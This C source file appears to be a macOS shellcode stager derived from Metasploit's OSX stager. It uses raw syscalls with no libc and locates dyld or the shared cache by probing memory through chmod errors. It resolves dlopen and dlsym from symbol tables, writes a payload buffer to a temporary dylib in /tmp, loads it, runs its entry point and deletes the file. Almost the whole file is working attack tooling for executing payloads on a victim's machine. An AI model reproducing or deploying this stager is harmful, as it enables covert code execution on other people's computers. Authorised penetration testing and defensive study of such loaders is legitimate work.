/*
 * Based on Metasploit's OSX Stager Code
 * Copyright: 2006-2026, Rapid7, Inc.
 * License: BSD-3-clause
 *
 * References:
 * @parchedmind
 * https://github.com/CylanceVulnResearch/osx_runbin/blob/master/run_bin.c
 *
 * @nologic
 * https://github.com/nologic/shellcc
 */

#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <fcntl.h>
#include <sys/sysctl.h>
// NOTE: This file is intentionally "freestanding-ish" and avoids calling libc.
// It is built into a Mach-O, then relevant segments are extracted into a flat in-memory
// image and executed as shellcode.

#define DYLD_BASE_ADDR 0x00007fff5fc00000
#define MAX_OSXVM_ADDR 0x00007ffffffff000

struct dyld_cache_header {
  char     magic[16];
  uint32_t mappingOffset;
  uint32_t mappingCount;
  uint32_t imagesOffsetOld;
  uint32_t imagesCountOld;
  uint64_t dyldBaseAddress;
  uint64_t codeSignatureOffset;
  uint64_t codeSignatureSize;
  uint64_t slideInfoOffsetUnused;
  uint64_t slideInfoSizeUnused;
  uint64_t localSymbolsOffset;
  uint64_t localSymbolsSize;
  uint8_t  uuid[16];
  uint64_t cacheType;
  uint32_t branchPoolsOffset;
  uint32_t branchPoolsCount;
  uint64_t accelerateInfoAddr;
  uint64_t accelerateInfoSize;
  uint64_t imagesTextOffset;
  uint64_t imagesTextCount;
  uint64_t patchInfoAddr;
  uint64_t patchInfoSize;
  uint64_t otherImageGroupAddrUnused;
  uint64_t otherImageGroupSizeUnused;
  uint64_t progClosuresAddr;
  uint64_t progClosuresSize;
  uint64_t progClosuresTrieAddr;
  uint64_t progClosuresTrieSize;
  uint32_t platform;
  uint32_t formatVersion          : 8,
           dylibsExpectedOnDisk   : 1,
           simulator              : 1,
           locallyBuiltCache      : 1,
           builtFromChainedFixups : 1,
           padding                : 20;
  uint64_t sharedRegionStart;
  uint64_t sharedRegionSize;
  uint64_t maxSlide;
  uint64_t dylibsImageArrayAddr;
  uint64_t dylibsImageArraySize;
  uint64_t dylibsTrieAddr;
  uint64_t dylibsTrieSize;
  uint64_t otherImageArrayAddr;
  uint64_t otherImageArraySize;
  uint64_t otherTrieAddr;
  uint64_t otherTrieSize;
  uint32_t mappingWithSlideOffset;
  uint32_t mappingWithSlideCount;
  uint64_t dylibsPBLStateArrayAddrUnused;
  uint64_t dylibsPBLSetAddr;
  uint64_t programsPBLSetPoolAddr;
  uint64_t programsPBLSetPoolSize;
  uint64_t programTrieAddr;
  uint32_t programTrieSize;
  uint32_t osVersion;
  uint32_t altPlatform;
  uint32_t altOsVersion;
  uint64_t swiftOptsOffset;
  uint64_t swiftOptsSize;
  uint32_t subCacheArrayOffset;
  uint32_t subCacheArrayCount;
  uint8_t  symbolFileUUID[16];
  uint64_t rosettaReadOnlyAddr;
  uint64_t rosettaReadOnlySize;
  uint64_t rosettaReadWriteAddr;
  uint64_t rosettaReadWriteSize;
  uint32_t imagesOffset;
  uint32_t imagesCount;
};

struct dyld_cache_image_info {
  uint64_t address;
  uint64_t modTime;
  uint64_t inode;
  uint32_t pathFileOffset;
  uint32_t pad;
};

struct shared_file_mapping {
  uint64_t address;
  uint64_t size;
  uint64_t file_offset;
  uint32_t max_prot;
  uint32_t init_prot;
};

typedef void * (*Dlopen_ptr)(const char *path, int mode);
typedef void * (*Dlsym_ptr)(void *handle, const char *symbol);

int string_compare(const char* s1, const char* s2)
{
  while (*s1 != '\0' && *s1 == *s2) {
    s1++;
    s2++;
  }
  return (*(unsigned char *)s1) - (*(unsigned char *)s2);
}

void * memcpy2(void *dest, const void *src, size_t len)
{
  char *d = dest;
  const char *s = src;
  while (len--)
    *d++ = *s++;
  return dest;
}

// Used to probe whether a page is mapped (syscall returns EFAULT on unmapped).
uint64_t syscall_chmod(uint64_t path, long mode)
{
  uint64_t chmod_no = 0x200000f;
  uint64_t ret = 0;
#ifdef __aarch64__
  __asm__ volatile(
      "mov x16, %1;\n"
      "mov x0, %2;\n"
      "mov x1, %3;\n"
      "svc #0;\n"
      "mov %0, x0;\n"
      : "=r"(ret)
      : "r"(chmod_no), "r"(path), "r"(mode)
      : "x16", "x0", "x1", "memory" );
#else
  __asm__(
      "movq %1, %%rax;\n"
      "movq %2, %%rdi;\n"
      "movq %3, %%rsi;\n"
      "syscall;\n"
      "movq %%rax, %0;\n"
      : "=g"(ret)
      : "g"(chmod_no), "S"(path), "g"(mode)
      : "rax", "rdi" );
#endif
  return ret;
}

uint64_t syscall_getpid()
{
  uint64_t getpid_no = 0x2000014; // SYS_getpid (20)
  uint64_t ret = 0;
#ifdef __aarch64__
  __asm__ volatile(
      "mov x16, %1;\n"
      "svc #0;\n"
      "mov %0, x0;\n"
      : "=r"(ret)
      : "r"(getpid_no)
      : "x16", "x0", "memory" );
#else
  __asm__(
      "movq %1, %%rax;\n"
      "syscall;\n"
      "movq %%rax, %0;\n"
      : "=g"(ret)
      : "g"(getpid_no)
      : "rax" );
#endif
  return ret;
}

uint64_t syscall_open(uint64_t path, long flags, long mode)
{
  uint64_t open_no = 0x2000005; // SYS_open (5)
  uint64_t ret = (uint64_t)-1;
#ifdef __aarch64__
  __asm__ volatile(
      "mov x16, %1;\n"
      "mov x0, %2;\n"
      "mov x1, %3;\n"
      "mov x2, %4;\n"
      "svc #0;\n"
      "b.cc 1f;\n"
      "mov x0, #-1;\n"
      "1:\n"
      "mov %0, x0;\n"
      : "=r"(ret)
      : "r"(open_no), "r"(path), "r"(flags), "r"(mode)
      : "x16", "x0", "x1", "x2", "memory" );
#endif
  return ret;
}

uint64_t syscall_write(long fd, uint64_t buf, uint64_t len)
{
  uint64_t write_no = 0x2000004; // SYS_write (4)
  uint64_t ret = (uint64_t)-1;
#ifdef __aarch64__
  __asm__ volatile(
      "mov x16, %1;\n"
      "mov x0, %2;\n"
      "mov x1, %3;\n"
      "mov x2, %4;\n"
      "svc #0;\n"
      "b.cc 1f;\n"
      "mov x0, #-1;\n"
      "1:\n"
      "mov %0, x0;\n"
      : "=r"(ret)
      : "r"(write_no), "r"(fd), "r"(buf), "r"(len)
      : "x16", "x0", "x1", "x2", "memory" );
#endif
  return ret;
}

uint64_t syscall_close(long fd)
{
  uint64_t close_no = 0x2000006; // SYS_close (6)
  uint64_t ret = (uint64_t)-1;
#ifdef __aarch64__
  __asm__ volatile(
      "mov x16, %1;\n"
      "mov x0, %2;\n"
      "svc #0;\n"
      "b.cc 1f;\n"
      "mov x0, #-1;\n"
      "1:\n"
      "mov %0, x0;\n"
      : "=r"(ret)
      : "r"(close_no), "r"(fd)
      : "x16", "x0", "memory" );
#endif
  return ret;
}

uint64_t syscall_unlink(uint64_t path)
{
  uint64_t unlink_no = 0x200000a; // SYS_unlink (10)
  uint64_t ret = (uint64_t)-1;
#ifdef __aarch64__
  __asm__ volatile(
      "mov x16, %1;\n"
      "mov x0, %2;\n"
      "svc #0;\n"
      "b.cc 1f;\n"
      "mov x0, #-1;\n"
      "1:\n"
      "mov %0, x0;\n"
      : "=r"(ret)
      : "r"(unlink_no), "r"(path)
      : "x16", "x0", "memory" );
#endif
  return ret;
}

uint64_t syscall_shared_region_check_np()
{
  long shared_region_check_np = 0x2000126; // #294
  uint64_t address = 0;
  unsigned long ret = 0;
#ifdef __aarch64__
  __asm__ volatile(
      "mov x16, %1;\n"
      "mov x0, %2;\n"
      "svc #0;\n"
      "mov %0, x0;\n"
      : "=r"(ret)
      : "r"(shared_region_check_np), "r"(&address)
      : "x16", "x0", "memory" );
#else
  __asm__(
      "movq %1, %%rax;\n"
      "movq %2, %%rdi;\n"
      "syscall;\n"
      "movq %%rax, %0;\n"
      : "=g"(ret)
      : "g"(shared_region_check_np), "g"(&address)
      : "rax", "rdi" );
#endif
  (void)ret;
  return address;
}

int detect_sierra()
{
  uint64_t sc_sysctl = 0x20000ca;
  int name[] = { CTL_KERN, KERN_OSRELEASE };
  uint64_t nameptr = (uint64_t)&name;
  uint64_t namelen = sizeof(name)/sizeof(name[0]);
  char osrelease[32];
  size_t size = sizeof(osrelease);
  uint64_t valptr = (uint64_t)osrelease;
  uint64_t valsizeptr = (uint64_t)&size;
  uint64_t ret = 0;

#ifdef __aarch64__
  __asm__ volatile(
      "mov x16, %1;\n"
      "mov x0, %2;\n"
      "mov x1, %3;\n"
      "mov x2, %4;\n"
      "mov x3, %5;\n"
      "eor x4, x4, x4;\n"
      "eor x5, x5, x5;\n"
      "svc #0;\n"
      "mov %0, x0;\n"
      : "=r"(ret)
      : "r"(sc_sysctl), "r"(nameptr), "r"(namelen), "r"(valptr), "r"(valsizeptr)
      : "x16", "x0", "x1", "x2", "x3", "x4", "x5", "memory" );
#else
  __asm__(
      "mov %1, %%rax;\n"
      "mov %2, %%rdi;\n"
      "mov %3, %%rsi;\n"
      "mov %4, %%rdx;\n"
      "mov %5, %%r10;\n"
      "xor %%r8, %%r8;\n"
      "xor %%r9, %%r9;\n"
      "syscall;\n"
      "mov %%rax, %0;\n"
      : "=g"(ret)
      : "g"(sc_sysctl), "g"(nameptr), "g"(namelen), "g"(valptr), "g"(valsizeptr)
      : );
#endif

  // osrelease is 16.x.x on Sierra
  if (ret == 0 && size > 2) {
    if (osrelease[0] == '1' && osrelease[1] < '6') {
      return 0;
    }
    if (osrelease[0] <= '9' && osrelease[1] == '.') {
      return 0;
    }
  }
  return 1;
}

uint64_t find_macho(uint64_t addr, unsigned int increment)
{
  while(addr < MAX_OSXVM_ADDR) {
    uint64_t ptr = addr;
    unsigned long ret = syscall_chmod(ptr, 0777);
    if (ret == 0x2 && ((int *)ptr)[0] == MH_MAGIC_64) {
      return ptr;
    }

    addr += increment;
  }
  return 0;
}

void * find_symbol(uint64_t base, char* symbol, uint64_t offset)
{
  struct segment_command_64 *sc, *linkedit, *text;
  struct load_command *lc;
  struct symtab_command *symtab;
  struct nlist_64 *nl;

  char *strtab;
  char linkedit_name[] = { '_', '_', 'L', 'I', 'N', 'K', 'E', 'D', 'I', 'T', 0 };
  char text_name[] = { '_', '_', 'T', 'E', 'X', 'T', 0 };
  symtab = 0;
  linkedit = 0;
  text = 0;

  lc = (struct load_command *)(base + sizeof(struct mach_header_64));
  for (int i=0; i<((struct mach_header_64 *)base)->ncmds; i++) {
    if (lc->cmd == LC_SYMTAB) {
      symtab = (struct symtab_command *)lc;
    } else if (lc->cmd == LC_SEGMENT_64) {
      sc = (struct segment_command_64 *)lc;
      char * segname = ((struct segment_command_64 *)lc)->segname;
      if (string_compare(segname, linkedit_name) == 0) {
        linkedit = sc;
      } else if (string_compare(segname, text_name) == 0) {
        text = sc;
      }
    }
    lc = (struct load_command *)((unsigned long)lc + lc->cmdsize);
  }

  if (!linkedit || !symtab || !text) {
    return 0;
  }

  unsigned long file_slide = linkedit->vmaddr - text->vmaddr - linkedit->fileoff;
  strtab = (char *)(base + file_slide + symtab->stroff);

  nl = (struct nlist_64 *)(base + file_slide + symtab->symoff);
  for (int i=0; i<symtab->nsyms; i++) {
    char *name = strtab + nl[i].n_un.n_strx;
    if (string_compare(name, symbol) == 0) {
      // Ignore undefined symbols (imports). In the shared cache, many images
      // reference _dlopen/_dlsym but only libdyld defines them.
      if ((nl[i].n_type & N_TYPE) == N_UNDF || nl[i].n_value == 0) {
        continue;
      }
      return (void*)(nl[i].n_value + offset);
    }
  }

  return 0;
}

static int u64_to_dec(uint64_t v, char *out)
{
  char tmp[32];
  int n = 0;
  if (v == 0) {
    out[0] = '0';
    return 1;
  }
  while (v > 0 && n < (int)sizeof(tmp)) {
    tmp[n++] = (char)('0' + (v % 10));
    v /= 10;
  }
  for (int i = 0; i < n; i++) {
    out[i] = tmp[n - 1 - i];
  }
  return n;
}

static int write_all(long fd, uint64_t buf, uint64_t len)
{
  uint64_t off = 0;
  while (off < len) {
    uint64_t r = syscall_write(fd, buf + off, len - off);
    if (r == (uint64_t)-1 || r == 0) {
      return -1;
    }
    off += r;
  }
  return 0;
}

static int beignet_loader(void *buffer_ro, uint64_t buffer_size, const char *entry_symbol)
{
  char default_entry[] = { '_', 'm', 'a', 'i', 'n', 0 };
  if (entry_symbol == 0) {
    entry_symbol = default_entry;
  }
  if (buffer_ro == 0 || buffer_size == 0) {
    return 1;
  }

  int sierra = detect_sierra();
  uint64_t offset = 0;
  Dlopen_ptr dlopen_func = 0;
  Dlsym_ptr dlsym_func = 0;
  char sym_dlopen[] = { '_', 'd', 'l', 'o', 'p', 'e', 'n', 0 };
  char sym_dlsym[] = { '_', 'd', 'l', 's', 'y', 'm', 0 };
  if (sierra) {
    uint64_t shared_region_start = syscall_shared_region_check_np();
    if (shared_region_start < 0x100000000) {
      return 20;
    }

    struct dyld_cache_header *header = (void*)shared_region_start;
    if (!(header->magic[0] == 'd' && header->magic[1] == 'y' && header->magic[2] == 'l' && header->magic[3] == 'd')) {
      return 21;
    }
    struct shared_file_mapping *sfm = (struct shared_file_mapping *)((char*)header + header->mappingOffset);
    // Slide between the on-disk/shared-cache VM addresses and this process' mapping.
    offset = (uint64_t)header - sfm->address;
    if (offset < 0x1000000 || offset > 0x100000000) {
      return 26;
    }

    uint32_t imagesCount = header->imagesCountOld;
    if (imagesCount == 0) {
      imagesCount = header->imagesCount;
    }
    uint32_t imagesOffset = header->imagesOffsetOld;
    if (imagesOffset == 0) {
      imagesOffset = header->imagesOffset;
    }
    if (imagesCount == 0 || imagesOffset == 0) {
      return 22;
    }
    if (imagesCount < 1000) {
      return 27;
    }

    struct dyld_cache_image_info *dcimg = (struct dyld_cache_image_info *)((char*)header + imagesOffset);
    char *p0 = (char *)shared_region_start + dcimg->pathFileOffset;
    if (syscall_chmod((uint64_t)p0, 0777) == 14 || p0[0] != '/') {
      return 24;
    }
    if (dcimg->address < 0x100000000) {
      return 25;
    }
    char want_libdyld[] = { '/', 'u', 's', 'r', '/', 'l', 'i', 'b', '/', 's', 'y', 's', 't', 'e', 'm', '/', 'l', 'i', 'b', 'd', 'y', 'l', 'd', '.', 'd', 'y', 'l', 'i', 'b', 0 };
    uint64_t dyld_unslid = 0;
    for (uint32_t i = 0; i < imagesCount; i++) {
      uint32_t pfo = dcimg[i].pathFileOffset;
      if (pfo == 0) {
        continue;
      }

      char *pathi = (char *)shared_region_start + pfo;
      // Probe whether this is a mapped pointer. Unmapped pointers yield EFAULT (14).
      if (syscall_chmod((uint64_t)pathi, 0777) == 14) {
        continue;
      }

      if (string_compare(pathi, want_libdyld) == 0) {
        dyld_unslid = dcimg[i].address;
        break;
      }
    }
    if (!dyld_unslid) {
      return 23;
    }

    uint64_t dyld = dyld_unslid + offset;
    dlopen_func = (Dlopen_ptr)find_symbol(dyld, sym_dlopen, offset);
    if (!dlopen_func) {
      return 3;
    }
    dlsym_func = (Dlsym_ptr)find_symbol(dyld, sym_dlsym, offset);
    if (!dlsym_func) {
      return 4;
    }
  } else {
    uint64_t dyld = find_macho(DYLD_BASE_ADDR, 0x1000);
    if (!dyld) {
      return 2;
    }
    offset = dyld - DYLD_BASE_ADDR;
    dlopen_func = find_symbol(dyld, sym_dlopen, offset);
    if (!dlopen_func) {
      return 3;
    }
    dlsym_func = find_symbol(dyld, sym_dlsym, offset);
    if (!dlsym_func) {
      return 4;
    }
  }

  char path[64];
  int pos = 0;
  char pre[] = { '/', 't', 'm', 'p', '/', 'b', 'e', 'i', 'g', 'n', 'e', 't', '_', 0 };
  for (int i = 0; pre[i] != 0; i++) {
    path[pos++] = pre[i];
  }
  uint64_t pid = syscall_getpid();
  pos += u64_to_dec(pid, path + pos);
  char suf[] = { '.', 'd', 'y', 'l', 'i', 'b', 0 };
  for (int i = 0; suf[i] != 0; i++) {
    path[pos++] = suf[i];
  }
  path[pos] = 0;

  // Best-effort cleanup of any previous run.
  syscall_unlink((uint64_t)path);

  uint64_t fd = syscall_open((uint64_t)path, O_CREAT | O_TRUNC | O_WRONLY, 0755);
  if (fd == (uint64_t)-1) {
    return 5;
  }
  if (write_all((long)fd, (uint64_t)buffer_ro, buffer_size) != 0) {
    syscall_close((long)fd);
    syscall_unlink((uint64_t)path);
    return 6;
  }
  syscall_close((long)fd);

  // RTLD_NOW (2)
  void *handle = dlopen_func(path, 2);
  if (!handle) {
    syscall_unlink((uint64_t)path);
    return 7;
  }

  const char *sym = entry_symbol;
  if (sym[0] == '_') {
    sym++;
  }
  void *addr_entry = dlsym_func(handle, sym);
  if (!addr_entry) {
    syscall_unlink((uint64_t)path);
    return 8;
  }

  void (*entry_func)(void) = (void (*)(void))addr_entry;
  entry_func();

  syscall_unlink((uint64_t)path);
  return 0;
}

int main(int argc, char** argv)
{
  (void)argc;
  (void)argv;
  (void)beignet_loader(0, 0, 0);
  return 0;
}
